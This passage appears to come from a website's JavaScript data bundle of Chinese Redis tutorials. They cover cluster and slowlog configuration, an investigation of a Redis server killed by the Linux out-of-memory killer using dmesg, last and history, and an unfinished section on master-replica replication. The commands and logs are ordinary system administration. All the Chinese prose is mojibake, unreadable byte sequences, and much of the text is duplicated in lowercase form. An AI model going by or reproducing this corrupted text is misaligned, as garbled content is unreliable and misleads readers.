éè½¬ç§»ï¼åä»»ä½éé¶å¼é½å¯è½å¯¼è´ redis éç¾¤å¨ä¸»æå¡å¨åºç°æéåä¸å¯ç¨ã å¨è¿ç§æåµä¸ï¼åªæåå§ä¸»èç¹éæ°å å¥éç¾¤æ¶ï¼éç¾¤æä¼è¿åå¯ç¨ã\n\ncluster-migration-barrier 1\n\n\n1\n\n\nä¸»èç¹å°ä¿æè¿æ¥çæå°ä»èç¹æ°éï¼ä»¥ä¾¿å¦ä¸ä¸ªä»èç¹è¿ç§»å°ä¸åä»»ä½ä»èç¹è¦ççä¸»èç¹ã\n\ncluster-require-full-coverage yes\n\n\n1\n\n\nå½ cluster-require-full-coverage ä¸º no æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä»ç¶å¯ç¨ã\n\nå½ cluster-require-full-coverage ä¸º yes æ¶ï¼è¡¨ç¤ºå½è´è´£ä¸ä¸ªææ§½çä¸»åºä¸çº¿ä¸æ²¡æç¸åºçä»åºè¿è¡æéæ¢å¤æ¶ï¼éç¾¤ä¸å¯ç¨ã\n\ncluster-replica-no-failover no\n\n\n1\n\n\nè®¾ç½®ä¸º yes æ¶ï¼æ­¤éé¡¹å¯é²æ­¢ä»æå¡å¨å¨ä¸»æå¡å¨æéæé´å°è¯å¯¹ä¸»æå¡å¨è¿è¡æéè½¬ç§»ãä½æ¯ï¼ä¸»æå¡å¨ä»ç¶å¯ä»¥æ§è¡æå¨æéè½¬ç§»ï¼å¦æè¢«è¿«æ§è¡ï¼ã\n\ncluster-allow-reads-when-down no\n\n\n1\n\n\né»è®¤ä¸º no, è¡¨ç¤ºå½éç¾¤å ä¸»èç¹æ°éè¾¾ä¸å°æå°å¼æææ£åæ§½æ²¡æåéèè¢«æ è®°ä¸ºå¤±ææ¶ï¼èç¹å°åæ­¢ææçå®¢æ·ç«¯éè®¯ã è¿æ ·å¯ä»¥é¿åä»ä¸ä¸ªä¸ç¥ééç¾¤ç¶æååçèç¹è¯»å°ä¸ä¸è´æ°æ®çå±é©ã è®¾ä¸º yes ååè®¸éç¾¤å¤±ææ¶ä»å¯ä»¥ç±èç¹ä¸­è¯»åæ°æ®ã è¿æ ·æ¢ä¿è¯è¯»æä½çé«å¯ç¨æ§ï¼ ä¹é¿åä¸ä¸è´åæä½ï¼åæ¶å½ redis cluster ä»åå« 1 è³ 2 ä¸ªèç¹ï¼èæä¸ªèç¹å¤±æåæ å¯ç¨ä»èç¹æ¿ä»£ï¼ä¸å èç¹æ°éä¸è¶³ï¼æ æ³èªå¨éæ°åéæ£åæ§½ï¼åè¯¥åæ°è®¾ä¸º yes å¯ä¿è¯èç¹ä»ç¶å¯æ§è¡è¯»æä½ã\n\n\n# slow log æ¢æ¥å¿\n\nslowlog-log-slower-than 1000\n\n\n1\n\n\nå¶ä¸­ slowlog-log-slower-than è¡¨ç¤º slowlog çåå®çéï¼åªæ query æ§è¡æ¶é´å¤§äº slowlog-log-slower-than çæä¼å®ä¹ææ¢æ¥è¯¢ï¼æä¼è¢« slowlog è¿è¡è®°å½ãslowlog-log-slower-than è®¾ç½®çåä½æ¯å¾®å¦ï¼é»è®¤æ¯ 10000 å¾®å¦ï¼ä¹å°±æ¯ 10ms\n\nslowlog-max-len 128\n\n\n1\n\n\nslowlog-max-len è¡¨ç¤ºæ¢æ¥è¯¢æå¤§çæ¡æ°ï¼å½ slowlog è¶è¿è®¾å®çæå¤§å¼åï¼ä¼å°ææ©ç slowlog å é¤ï¼æ¯ä¸ª fifo éå\n\n\n# latency monitor å»¶è¿çè§å¨\n\nlatency-monitor-threshold 0\n\n\n1\n\n\nredis å»¶æ¶çæ§ç³»ç»å¨è¿è¡æ¶ä¼éæ ·ä¸äºæä½ï¼ä»¥ä¾¿æ¶éå¯è½å¯¼è´å»¶æ¶çæ°æ®æ ¹æºã\néè¿ latency å½ä»¤ å¯ä»¥æå°ä¸äºå¾æ ·åè·åä¸äºæ¥åï¼æ¹ä¾¿çæ§\nè¿ä¸ªç³»ç»ä»ä»è®°å½é£ä¸ªæ§è¡æ¶é´å¤§äºæç­äºé¢å®æ¶é´ï¼æ¯«ç§ï¼çæä½ï¼\nè¿ä¸ªé¢å®æ¶é´æ¯éè¿ latency-monitor-threshold éç½®æ¥æå®çï¼\nå½è®¾ç½®ä¸º 0 æ¶ï¼è¿ä¸ªçæ§ç³»ç»å¤äºåæ­¢ç¶æ\n\n\n# event notification äºä»¶éç¥\n\nnotify-keyspace-events ""\n\n\n1\n\n\n\n# advanced config é«çº§éç½®\n\nå½åå¸æ¡ç®åªæå°éæ¡ç®ä¸æå¤§æ¡ç®æªè¶è¿ç»å®éå¼æ¶ï¼å°ä½¿ç¨åå­é«æçæ°æ®ç»æå¯¹å¶è¿è¡ç¼ç \n\nhash-max-ziplist-entries 512\n\n\n1\n\n\næ°æ®éå°äºç­äº hash-max-ziplist-entries çç¨ ziplistï¼å¤§äº hash-max-ziplist-entries ç¨ hash\n\nhash-max-ziplist-value 64\n\n\n1\n\n\nvalue å¤§å°å°äºç­äº hash-max-ziplist-value çç¨ ziplistï¼å¤§äº hash-max-ziplist-value ç¨ hashã',charsets:{cjk:!0}},{title:"Redisè®°ä¸æ¬¡å®æºææ¥",frontmatter:{title:"Redisè®°ä¸æ¬¡å®æºææ¥",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1606",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1606.Redis%E8%AE%B0%E4%B8%80%E6%AC%A1%E5%AE%95%E6%9C%BA%E6%8E%92%E6%9F%A5.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1606.Redisè®°ä¸æ¬¡å®æºææ¥.md",key:"v-44f11504",path:"/Redis/1606/",lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:null,content:"æè¿å¬å¸è¦åä¸å¤© 8 äº¿çº§æ°æ®çç¼å­ï¼ç¶åè®©æå¯¹ redis è¿è¡ä¸æ³¢æ§è½æµè¯ï¼ä½æ¯ä»å¤©åç° redis çªç¶æ²¡æå¨è¿è¡ï¼å¹¶ä¸åå­æ²¡æä»»ä½å ç¨æåµãç¶åæå°±æ³å°åæ¥çæ¥å¿ï¼å¦ä¸\n\n                _._                                                  \n           _.-``__ ''-._                                             \n      _.-``    `.  `_.  ''-._           Redis 6.0.8 (00000000/0) 64 bit\n  .-`` .-```.  ```\\/    _.,_ ''-._                                   \n (    '      ,       .-`  | `,    )     Running in standalone mode\n |`-._`-...-` __...-.``-._|'` _.-'|     Port: 6379\n |    `-._   `._    /     _.-'    |     PID: 14135\n  `-._    `-._  `-./  _.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |           http://redis.io        \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |                                  \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n      `-._    `-.__.-'    _.-'                                       \n          `-._        _.-'                                           \n              `-.__.-'                                               \n\n14135:M 27 Sep 2020 20:36:47.498 # WARNING: The TCP backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n14135:M 27 Sep 2020 20:36:47.498 # Server initialized\n14135:M 27 Sep 2020 20:36:47.498 # WARNING overcommit_memory is set to 0! Background save may fail under low memory condition. To fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.\n14135:M 27 Sep 2020 20:36:47.498 # WARNING you have Transparent Huge Pages (THP) support enabled in your kernel. This will create latency and memory usage issues with Redis. To fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. Redis must be restarted after THP is disabled (set to 'madvise' or 'never').\n14135:M 27 Sep 2020 20:36:47.498 * Ready to accept connections\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ¥å¿é¤äºå¯å¨ä¿¡æ¯ä»¥å¤å¹¶æ²¡æè¾åºä»»ä½ææçä¿¡æ¯ãå¦æ redis æ¯è¢« cli å³æçè¯ï¼ä¼å¨æ¥å¿ä¿¡æ¯ä¸­æ bye bye çä¿¡æ¯ï¼ä½æ¥å¿æ²¡æï¼é£å°±æ¯å¯è½æ¯è¢« kill çï¼éè¿å¦ä¸å½ä»¤å¯ä»¥æ¥çæåµã\n\n[root@localhost log]# dmesg | egrep -i 'killed process'\n[ 1620.429506] Killed process 9696 (redis-server), UID 0, total-vm:23432912kB, anon-rss:18961524kB, file-rss:68kB, shmem-rss:0kB\n[338063.393365] Killed process 13956 (redis-server), UID 0, total-vm:33468100kB, anon-rss:26147740kB, file-rss:0kB, shmem-rss:0kB\n[367433.290406] Killed process 14135 (redis-server), UID 0, total-vm:39923260kB, anon-rss:34407376kB, file-rss:0kB, shmem-rss:0kB\n\n\n1\n2\n3\n4\n\n\nåç° redis çç¡®æ¯è¢« kill æçï¼æå¯å¨ redis çè¿ç¨æ¯ 14135ï¼åå¥½æ¥å° killed process æ¯æ 14135ãè¿å°æå¡å¨åªææèªå·±ç¥éï¼æä»¥å¯ä»¥ç´æ¥æé¤æ¯äººä¸ºçæåµãé£ç¨åºè¢« kill è°å°±åªæ linux èªå·±çç­ç¥äºï¼æä»¬ç¥é linux æ¯æ oom çç­ç¥å·ä½æ ¹æ®è®¾ç½®ç oom_score_adj çå¼æå³ï¼é£æä»¬ç´æ¥æ¥ä¸æ¯ä¸æ¯ oom åå ææ­»ï¼å½ä»¤å¦ä¸\n\n[root@localhost log]# grep \"Out of memory\" /var/log/messages  \nSep 27 16:45:11 localhost kernel: Out of memory: Kill process 13445 (redis-server) score 747 or sacrifice child\nSep 28 00:54:43 localhost kernel: Out of memory: Kill process 14135 (redis-server) score 951 or sacrifice child\n\n\n1\n2\n3\n\n\nçæ¥ççæ¯åå­ä¸å¤ç¨æ redis ç» kill äºãå¦ææ¯è¢«å¶ä»ç¨æ· kill æçè¯æä»¬è¯¥æä¹ææ¥ï¼\nåæ¥è¯¢æè¿åªäºç¨æ·ç»å½\n\n[root@localhost log]# last\nroot     pts/3        192.168.200.89   Sun Sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 12:59   still logged in \n\n\n1\n2\n3\n\n\nç¬¦å·                      æè¿°\nroot                    ç¨æ·\npts/3                   ç»ç«¯\n192.168.200.89          ç»å½è IP\nSun Sep 27 17:18        ç»å½æ¶é´\nstill logged in ï¼è¿å¨çº¿ï¼   ç»å½ç¶æ (è·ç¦»ä¸æ¬¡ç»å½æ¶é´)\n\nç¥éäºä»¥åä¹å¯ä»¥åªæ¥çæä¸ªç¨æ·ï¼æè¿éåªæ root ç¨æ·ï¼å®éæåµä¸­ï¼æ¯ä¸ªäººé½åºè¯¥æä¸ä¸ªè´¦æ·ï¼root åªæè¶çº§ç®¡çåæ¥æï¼å¦åé½ç¨ root ç¨æ·æ¯æ æ³ææ¥åºæ¥çã\n\n[root@localhost log]# last root\nroot     pts/3        192.168.200.89   Sun Sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 12:59   still logged in   \nroot     pts/2        192.168.200.89   Sun Sep 27 09:47   still logged in   \nroot     pts/1        192.168.200.89   Sun Sep 27 09:46 - 12:59  (03:12)  \n\n\n1\n2\n3\n4\n5\n\n\nhistory å½ä»¤ï¼å¯ä»¥æç¨æ·æç¨è¿çåå²å½ä»¤æ¥åºæ¥ï¼æ¯ä¸ªç¨æ·é½ä¼æè¿æ ·ä¸ä¸ªæä»¶ã\n\næä»¤   æè¿°\n-c   æ¸ç©ºå½ååå²å½ä»¤\n-a   å°åå²å½ä»¤ç¼å²åºä¸­å½ä»¤åå¥åå²å½ä»¤æä»¶ã/root/.bash_historyã\n-r   å°åå²å½ä»¤æä»¶ä¸­çå½ä»¤è¯»å¥å½ååå²å½ä»¤ç¼å²åº\n-w   å°å½ååå²å½ä»¤ç¼å²åºå½ä»¤åå¥åå²å½ä»¤æä»¶ä¸­ã/root/.bash_historyã\nn    å¦æ n=3 æå°æè¿ 3 æ¡åå²å½ä»¤\n\n[root@localhost log]# history 10\n 1030  w rott\n 1031  w root\n 1032  history\n 1033  last\n 1034  last root\n 1035  w\n 1036  lastlog\n 1037  history\n 1038  history -h\n 1039  history 10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\né»è®¤ history ä¸å¸¦æ§è¡æ¶é´ï¼æä»¥å¦ææ¯åä¸ä¸ªç¨æ·æ²¡åæ³åºåæ¯è°ä½¿ç¨äº kill é æç ´åã\nè®© history å¸¦ææ¶é´\n\necho 'export HISTTIMEFORMAT=\"%F %T  \"' >> /etc/bashrc\nsource /etc/bashrc\n\n\n1\n2\n\n\n[root@localhost log]# history 6\n 1048  2020-09-28 11:03:21  echo 'export HISTTIMEFORMAT=\"%F %T  \"' >> /etc/bashrc\n 1049  2020-09-28 11:03:25  source /etc/bashrc\n 1050  2020-09-28 11:03:27  history 10\n 1051  2020-09-28 11:04:27  ls\n 1052  2020-09-28 11:04:30  history 10\n 1053  2020-09-28 11:04:45  history 6\n\n\n1\n2\n3\n4\n5\n6\n7\n",normalizedContent:"æè¿å¬å¸è¦åä¸å¤© 8 äº¿çº§æ°æ®çç¼å­ï¼ç¶åè®©æå¯¹ redis è¿è¡ä¸æ³¢æ§è½æµè¯ï¼ä½æ¯ä»å¤©åç° redis çªç¶æ²¡æå¨è¿è¡ï¼å¹¶ä¸åå­æ²¡æä»»ä½å ç¨æåµãç¶åæå°±æ³å°åæ¥çæ¥å¿ï¼å¦ä¸\n\n                _._                                                  \n           _.-``__ ''-._                                             \n      _.-``    `.  `_.  ''-._           redis 6.0.8 (00000000/0) 64 bit\n  .-`` .-```.  ```\\/    _.,_ ''-._                                   \n (    '      ,       .-`  | `,    )     running in standalone mode\n |`-._`-...-` __...-.``-._|'` _.-'|     port: 6379\n |    `-._   `._    /     _.-'    |     pid: 14135\n  `-._    `-._  `-./  _.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |           http://redis.io        \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n |`-._`-._    `-.__.-'    _.-'_.-'|                                  \n |    `-._`-._        _.-'_.-'    |                                  \n  `-._    `-._`-.__.-'_.-'    _.-'                                   \n      `-._    `-.__.-'    _.-'                                       \n          `-._        _.-'                                           \n              `-.__.-'                                               \n\n14135:m 27 sep 2020 20:36:47.498 # warning: the tcp backlog setting of 511 cannot be enforced because /proc/sys/net/core/somaxconn is set to the lower value of 128.\n14135:m 27 sep 2020 20:36:47.498 # server initialized\n14135:m 27 sep 2020 20:36:47.498 # warning overcommit_memory is set to 0! background save may fail under low memory condition. to fix this issue add 'vm.overcommit_memory = 1' to /etc/sysctl.conf and then reboot or run the command 'sysctl vm.overcommit_memory=1' for this to take effect.\n14135:m 27 sep 2020 20:36:47.498 # warning you have transparent huge pages (thp) support enabled in your kernel. this will create latency and memory usage issues with redis. to fix this issue run the command 'echo madvise > /sys/kernel/mm/transparent_hugepage/enabled' as root, and add it to your /etc/rc.local in order to retain the setting after a reboot. redis must be restarted after thp is disabled (set to 'madvise' or 'never').\n14135:m 27 sep 2020 20:36:47.498 * ready to accept connections\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n\n\næ¥å¿é¤äºå¯å¨ä¿¡æ¯ä»¥å¤å¹¶æ²¡æè¾åºä»»ä½ææçä¿¡æ¯ãå¦æ redis æ¯è¢« cli å³æçè¯ï¼ä¼å¨æ¥å¿ä¿¡æ¯ä¸­æ bye bye çä¿¡æ¯ï¼ä½æ¥å¿æ²¡æï¼é£å°±æ¯å¯è½æ¯è¢« kill çï¼éè¿å¦ä¸å½ä»¤å¯ä»¥æ¥çæåµã\n\n[root@localhost log]# dmesg | egrep -i 'killed process'\n[ 1620.429506] killed process 9696 (redis-server), uid 0, total-vm:23432912kb, anon-rss:18961524kb, file-rss:68kb, shmem-rss:0kb\n[338063.393365] killed process 13956 (redis-server), uid 0, total-vm:33468100kb, anon-rss:26147740kb, file-rss:0kb, shmem-rss:0kb\n[367433.290406] killed process 14135 (redis-server), uid 0, total-vm:39923260kb, anon-rss:34407376kb, file-rss:0kb, shmem-rss:0kb\n\n\n1\n2\n3\n4\n\n\nåç° redis çç¡®æ¯è¢« kill æçï¼æå¯å¨ redis çè¿ç¨æ¯ 14135ï¼åå¥½æ¥å° killed process æ¯æ 14135ãè¿å°æå¡å¨åªææèªå·±ç¥éï¼æä»¥å¯ä»¥ç´æ¥æé¤æ¯äººä¸ºçæåµãé£ç¨åºè¢« kill è°å°±åªæ linux èªå·±çç­ç¥äºï¼æä»¬ç¥é linux æ¯æ oom çç­ç¥å·ä½æ ¹æ®è®¾ç½®ç oom_score_adj çå¼æå³ï¼é£æä»¬ç´æ¥æ¥ä¸æ¯ä¸æ¯ oom åå ææ­»ï¼å½ä»¤å¦ä¸\n\n[root@localhost log]# grep \"out of memory\" /var/log/messages  \nsep 27 16:45:11 localhost kernel: out of memory: kill process 13445 (redis-server) score 747 or sacrifice child\nsep 28 00:54:43 localhost kernel: out of memory: kill process 14135 (redis-server) score 951 or sacrifice child\n\n\n1\n2\n3\n\n\nçæ¥ççæ¯åå­ä¸å¤ç¨æ redis ç» kill äºãå¦ææ¯è¢«å¶ä»ç¨æ· kill æçè¯æä»¬è¯¥æä¹ææ¥ï¼\nåæ¥è¯¢æè¿åªäºç¨æ·ç»å½\n\n[root@localhost log]# last\nroot     pts/3        192.168.200.89   sun sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 12:59   still logged in \n\n\n1\n2\n3\n\n\nç¬¦å·                      æè¿°\nroot                    ç¨æ·\npts/3                   ç»ç«¯\n192.168.200.89          ç»å½è ip\nsun sep 27 17:18        ç»å½æ¶é´\nstill logged in ï¼è¿å¨çº¿ï¼   ç»å½ç¶æ (è·ç¦»ä¸æ¬¡ç»å½æ¶é´)\n\nç¥éäºä»¥åä¹å¯ä»¥åªæ¥çæä¸ªç¨æ·ï¼æè¿éåªæ root ç¨æ·ï¼å®éæåµä¸­ï¼æ¯ä¸ªäººé½åºè¯¥æä¸ä¸ªè´¦æ·ï¼root åªæè¶çº§ç®¡çåæ¥æï¼å¦åé½ç¨ root ç¨æ·æ¯æ æ³ææ¥åºæ¥çã\n\n[root@localhost log]# last root\nroot     pts/3        192.168.200.89   sun sep 27 17:18   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 12:59   still logged in   \nroot     pts/2        192.168.200.89   sun sep 27 09:47   still logged in   \nroot     pts/1        192.168.200.89   sun sep 27 09:46 - 12:59  (03:12)  \n\n\n1\n2\n3\n4\n5\n\n\nhistory å½ä»¤ï¼å¯ä»¥æç¨æ·æç¨è¿çåå²å½ä»¤æ¥åºæ¥ï¼æ¯ä¸ªç¨æ·é½ä¼æè¿æ ·ä¸ä¸ªæä»¶ã\n\næä»¤   æè¿°\n-c   æ¸ç©ºå½ååå²å½ä»¤\n-a   å°åå²å½ä»¤ç¼å²åºä¸­å½ä»¤åå¥åå²å½ä»¤æä»¶ã/root/.bash_historyã\n-r   å°åå²å½ä»¤æä»¶ä¸­çå½ä»¤è¯»å¥å½ååå²å½ä»¤ç¼å²åº\n-w   å°å½ååå²å½ä»¤ç¼å²åºå½ä»¤åå¥åå²å½ä»¤æä»¶ä¸­ã/root/.bash_historyã\nn    å¦æ n=3 æå°æè¿ 3 æ¡åå²å½ä»¤\n\n[root@localhost log]# history 10\n 1030  w rott\n 1031  w root\n 1032  history\n 1033  last\n 1034  last root\n 1035  w\n 1036  lastlog\n 1037  history\n 1038  history -h\n 1039  history 10\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\né»è®¤ history ä¸å¸¦æ§è¡æ¶é´ï¼æä»¥å¦ææ¯åä¸ä¸ªç¨æ·æ²¡åæ³åºåæ¯è°ä½¿ç¨äº kill é æç ´åã\nè®© history å¸¦ææ¶é´\n\necho 'export histtimeformat=\"%f %t  \"' >> /etc/bashrc\nsource /etc/bashrc\n\n\n1\n2\n\n\n[root@localhost log]# history 6\n 1048  2020-09-28 11:03:21  echo 'export histtimeformat=\"%f %t  \"' >> /etc/bashrc\n 1049  2020-09-28 11:03:25  source /etc/bashrc\n 1050  2020-09-28 11:03:27  history 10\n 1051  2020-09-28 11:04:27  ls\n 1052  2020-09-28 11:04:30  history 10\n 1053  2020-09-28 11:04:45  history 6\n\n\n1\n2\n3\n4\n5\n6\n7\n",charsets:{cjk:!0}},{title:"Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º",frontmatter:{title:"Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º",date:"2023-06-25T09:22:36.000Z",permalink:"/Redis/1607",sidebar:!0,article:!1,comment:!1,editLink:!1},regularPath:"/04.%E4%B8%AD%E9%97%B4%E4%BB%B6/03.redis/1607.Redis%E9%AB%98%E5%8F%AF%E7%94%A8(%E4%B8%80)%20%E4%B8%BB%E4%BB%8E%E7%90%86%E8%AE%BA.html",relativePath:"04.ä¸­é´ä»¶/03.redis/1607.Redisé«å¯ç¨(ä¸) ä¸»ä»çè®º.md",key:"v-754a1f6d",path:"/Redis/1607/",headers:[{level:2,title:"å¤å¶",slug:"å¤å¶",normalizedTitle:"å¤å¶",charIndex:17},{level:2,title:"å·¥ä½æ¨¡å¼",slug:"å·¥ä½æ¨¡å¼",normalizedTitle:"å·¥ä½æ¨¡å¼",charIndex:1895},{level:3,title:"1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£",slug:"_1-è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£",normalizedTitle:"1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£",charIndex:1939},{level:3,title:"2. å»ºç«å¥æ¥å­è¿æ¥",slug:"_2-å»ºç«å¥æ¥å­è¿æ¥",normalizedTitle:"2. å»ºç«å¥æ¥å­è¿æ¥",charIndex:2114},{level:3,title:"3. åéPINGå½ä»¤",slug:"_3-åépingå½ä»¤",normalizedTitle:"3. åé ping å½ä»¤",charIndex:2267},{level:3,title:"4. èº«ä»½éªè¯",slug:"_4-èº«ä»½éªè¯",normalizedTitle:"4. èº«ä»½éªè¯",charIndex:2775},{level:3,title:"5. åéç«¯å£ä¿¡æ¯",slug:"_5-åéç«¯å£ä¿¡æ¯",normalizedTitle:"5. åéç«¯å£ä¿¡æ¯",charIndex:3304},{level:3,title:"6. åæ­¥ 7. å½ä»¤ä¼ æ­",slug:"_6-åæ­¥-7-å½ä»¤ä¼ æ­",normalizedTitle:"6. åæ­¥ 7. å½ä»¤ä¼ æ­",charIndex:3399}],lastUpdated:"12/22/2023, 3:44:32 PM",lastUpdatedTimestamp:1703231072e3,headersStr:"å¤å¶ å·¥ä½æ¨¡å¼ 1. è®¾ç½®ä¸»æå¡çå°åä¸ç«¯å£ 2. å»ºç«å¥æ¥å­è¿æ¥ 3. åéPINGå½ä»¤ 4. èº«ä»½éªè¯ 5. åéç«¯å£ä¿¡æ¯ 6. åæ­¥ 7. å½ä»¤ä¼ æ­",content:"Redis é«å¯ç¨ä¸»è¦æ¯ä½¿ç¨ ä¸»ä»å¤å¶ å å¨åµæ¥åï¼éç¾¤ä¸è½ç®æ¯é«å¯ç¨ï¼å ä¸ºå½èç¹ B æå¤§éçæ°æ®ï¼å¦æèç¹ B ææï¼å°±åæ æ³è®¿é®å°èç¹ B çæ°æ®ï¼å ä¸ºå¶ä»èç¹å¹¶ä¸ä¼æèç¹ B çæ°æ®ãå¶ä¸­çåå è·æ¬èº« Redis çè®¾è®¡æå³ã\n\n\n# å¤å¶\n\nä½¿ç¨åéç½®ä¸»ä»å¤å¶éå¸¸ç®åï¼ä» Redis æå¡å¨ï¼ä¸æç§° slaveï¼è½ç²¾ç¡®å¾å¤å¶ä¸» Redis æå¡å¨ï¼ä¸æç§° masterï¼çåå®¹ãæ¯æ¬¡å½ slave å master ä¹é´çè¿æ¥æ­å¼æ¶ï¼ slave ä¼èªå¨éè¿å° master ä¸ï¼å¹¶ä¸æ è®ºè¿æé´ master åçäºä»ä¹ï¼ slave é½å°å°è¯è®©èªèº«æä¸º master çç²¾ç¡®å¯æ¬ã\nè¿ä¸ªç³»ç»çè¿è¡ä¾é ä¸ä¸ªä¸»è¦çæºå¶ï¼\n\n * å½ä¸ä¸ª master å®ä¾åä¸ä¸ª slave å®ä¾è¿æ¥æ­£å¸¸æ¶ï¼ master ä¼åéä¸è¿ä¸²çå½ä»¤æµæ¥ä¿æå¯¹ slave çæ´æ°ï¼ä»¥ä¾¿äºå°èªèº«æ°æ®éçæ¹åå¤å¶ç» slave ï¼åæ¬å®¢æ·ç«¯çåå¥ãkey çè¿ææè¢«éåºç­ç­ (å¢é)ã\n * å½ master å slave ä¹é´çè¿æ¥æ­å¼ä¹åï¼å ä¸ºç½ç»é®é¢ãæèæ¯ä¸»ä»æè¯å°è¿æ¥è¶æ¶ï¼ slave éæ°è¿æ¥ä¸ master å¹¶ä¼å°è¯è¿è¡é¨åéåæ­¥ï¼è¿æå³çå®ä¼å°è¯åªè·åå¨æ­å¼è¿æ¥æé´åä¸¢å¤±çå½ä»¤ã\n * å½æ æ³è¿è¡é¨åéåæ­¥æ¶ï¼ slave ä¼è¯·æ±è¿è¡å¨ééåæ­¥ãè¿ä¼æ¶åå°ä¸ä¸ªæ´å¤æçè¿ç¨ï¼ä¾å¦ master éè¦åå»ºæææ°æ®çå¿«ç§ï¼å°ä¹åéç» slave ï¼ä¹åå¨æ°æ®éæ´æ¹æ¶æç»­åéå½ä»¤å° slave ã\n\nRedis é»è®¤ä½¿ç¨å¼æ­¥å¤å¶ï¼å¶ç¹ç¹æ¯ä½å»¶è¿åé«æ§è½ãslave æå¡ä¼å¼æ­¥å°ç¡®è®¤å¶ä» master æå¡å¨å¨ææ¥æ¶å°çæ°æ®éã\n\nRedis å¤å¶çéå¸¸éè¦çäºå®ï¼\n\n * Redis ä½¿ç¨å¼æ­¥å¤å¶ï¼slave å master ä¹é´å¼æ­¥ç¡®è®¤å¤çæ°æ®ã\n * ä¸ä¸ª master å¯ä»¥æ¥æå¤ä¸ª slave\n * slave å¯ä»¥æ¥åå¶ä» slave çè¿æ¥ãé¤äºå¤ä¸ª slave å¯ä»¥è¿æ¥å°åä¸ä¸ª master ä¹å¤ï¼ slave ä¹é´ä¹å¯ä»¥åå±å ç¶çç»æè¿æ¥å°å¶ä» slave ãèª Redis 4.0 èµ·ï¼ææç sub-slave å°ä¼ä» master æ¶å°å®å¨ä¸æ ·çå¤å¶æµã\n\n\n\n * Redis å¤å¶å¨ master æ¯éé»å¡çãè¿æå³ç master å¨ä¸ä¸ªæå¤ä¸ª slave è¿è¡åæ¬¡åæ­¥æèæ¯é¨åéåæ­¥æ¶ï¼å¯ä»¥ç»§ç»­å¤çæ¥è¯¢è¯·æ±ã\n * ä¸»ä»å¤å¶å¯¹äº slave æå¡å¨æ¥è¯´ä¹æ¯éé»å¡çï¼è¿æå³çï¼å³ä½¿ä» redis å¨è¿è¡ä¸»ä»å¤å¶è¿ç¨ä¸­ä¹å¯ä»¥æ¥åå¤ççæ¥è¯¢è¯·æ±ï¼åªä¸è¿è¿æ¶å slave è¿åçæ¯ä»¥åèçæ°æ®ï¼å¦æä½ ä¸æ³è¿æ ·ï¼é£ä¹å¨å¯å¨ redis æ¶ï¼å¯ä»¥å¨éç½®æä»¶ä¸­è¿è¡è®¾ç½®ï¼é£ä¹ slave å¨å¤å¶åæ­¥è¿ç¨ä¸­æ¥èªå¤ççæ¥è¯¢è¯·æ±é½ä¼è¿åéè¯¯ç»å®¢æ·ç«¯ï¼ï¼è½ç¶è¯´ä¸»ä»å¤å¶è¿ç¨ä¸­å¯¹äº slave æ¯éé»å¡çï¼ä½æ¯å½ slave ä» master åæ­¥è¿æ¥ææ°çæ°æ®åè¿éè¦å°æ°æ°æ®å è½½å°åå­ä¸­ï¼å¨å è½½å°åå­çè¿ç¨ä¸­æ¯é»å¡çï¼å¨è¿æ®µæ¶é´åçè¯·æ±å°ä¼è¢«é»ï¼ä½æ¯å³ä½¿å¯¹äºå¤§æ°æ®éï¼å è½½å°åå­çæ¶é´ä¹æ¯æ¯è¾å¤çï¼\n * ä¸»ä»å¤å¶æé«äº redis æå¡çæ©å±æ§ï¼é¿ååä¸ª redis æå¡å¨çè¯»åè®¿é®ååè¿å¤§çé®é¢ï¼åæ¶ä¹å¯ä»¥ç»ä¸ºæ°æ®å¤ä»½ååä½æä¾ä¸ç§è§£å³æ¹æ¡ï¼\n * ä¸ºäºé¿å master æå¡å¨åç£çååå¸¦æ¥çå¼éï¼å¯ä»¥éç½®è®© master ä¸å¨å°æ°æ®æä¹åå°ç£çï¼èæ¯éè¿è¿æ¥è®©ä¸ä¸ªéç½®ç slave æå¡å¨åæ¶çå°ç¸å³æ°æ®æä¹åå°ç£çï¼ä¸è¿è¿æ ·ä¼å­å¨ä¸ä¸ªé®é¢ï¼å°±æ¯ master æå¡å¨ä¸æ¦éå¯ï¼å ä¸º master æå¡å¨æ°æ®ä¸ºç©ºï¼è¿æ¶åéè¿ä¸»ä»åæ­¥å¯è½å¯¼è´ä» slave 